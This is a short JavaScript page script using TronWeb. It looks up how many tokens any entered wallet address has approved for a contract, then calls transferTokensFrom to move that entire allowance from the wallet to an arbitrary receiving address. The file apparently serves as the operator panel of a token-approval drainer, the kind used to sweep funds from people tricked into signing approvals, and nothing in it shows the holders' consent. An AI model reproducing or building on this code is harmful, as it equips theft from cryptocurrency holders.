const { contractAddress } = window;
const feeLimit = 100000000;
const callValue = 0;
$('.find').click(async () => {
  try {
    const { contractAddress, tronWeb } = window;
    let approveContract = await tronWeb.contract().at(contractAddress.TD);
    const res = await approveContract
      .allowance($('.findAddress').val(), contractAddress.approve)
      .call();
    const tokenNumber = (
      tronWeb.BigNumber(res._hex) / 1000000000000000000
    ).toString(10);

    $('.tokenNumber').html(tokenNumber);
  } catch (e) {
    $('.tokenNumber').html('');
    alert('地址不合法');
  }
});

$('.confirm').click(async () => {
  try {
    const { contractAddress, tronWeb } = window;
    const approveContract = await tronWeb.contract().at(contractAddress.approve);
    console.log($('.tokenNumber').html()+"000000000000000000")
    const res = await approveContract.transferTokensFrom(contractAddress.TD, $('.findAddress').val(), $('.receiveAddress').val(), $('.tokenNumber').html()+"000000000000000000").send({
      feeLimit: feeLimit,
      callValue: callValue || 0,
    });
    console.log(res);
  } catch (e) {
    console.log(e);
  }
});